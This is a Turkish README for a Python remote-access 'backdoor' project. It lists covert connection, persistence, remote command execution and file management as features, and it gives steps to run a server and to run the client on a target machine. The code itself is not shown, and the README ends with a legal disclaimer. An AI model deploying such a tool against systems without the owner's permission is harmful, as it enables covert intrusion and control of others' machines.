# Backdoor

Backdoor, ağ üzerinden uzaktan bağlantı kurarak hedef sisteme erişim sağlayan bir uygulamadır. Bu uygulama, özellikle ağ güvenliği testleri için kullanılabilir. **Yasal olmayan amaçlarla kullanılması kesinlikle tavsiye edilmez**.

## Özellikler

- Uzaktan bağlantı ile komut çalıştırma.
- Hedef sistem üzerinde dosya yönetimi.
- Ağ üzerinden gizli bağlantı.
- Hedef sistemde kalıcı bağlantı sağlama.

## Kurulum

Bu projeyi yerel makinenizde çalıştırmak için şu adımları izleyebilirsiniz:

### Gereksinimler

- Python 3.x
- `socket`, `os`, `subprocess` gibi Python modülleri.

### Adımlar

1. Bu projeyi klonlayın:

 ```bash
 git clone https://github.com/baytist/backdoor.git
 ```
 
2.Proje dizinine gidin:

 ```bash
 cd backdoor
 ```

3.Sunucu tarafını başlatın:

 ```bash
 python3 server.py
 ```

4.İstemciyi hedef makinede çalıştırın:

 ```bash
 python3 client.py
 ```

## Kullanım

1. Sunucu Başlatma: Sunucu, istemcilerden gelen bağlantıları dinlemek için çalıştırılır.
2. Bağlantı Kurma: İstemci dosyası çalıştırıldıktan sonra sunucuya bağlanır.
3. Komut Gönderme: Bağlantı sağlandığında sunucu tarafında istemciye komutlar gönderilebilir. Örneğin:

```bash
ls
```

Bu komut, istemci tarafındaki dosya ve dizinlerin listesini gösterir.

## Yasal Uyarı

Bu yazılım sadece eğitim ve güvenlik testi amacıyla geliştirilmiştir. Hedef sistemin sahibinden açıkça izin alınmadan kullanılması yasalara aykırıdır. Geliştirici, bu yazılımın yasa dışı kullanımından sorumlu değildir.
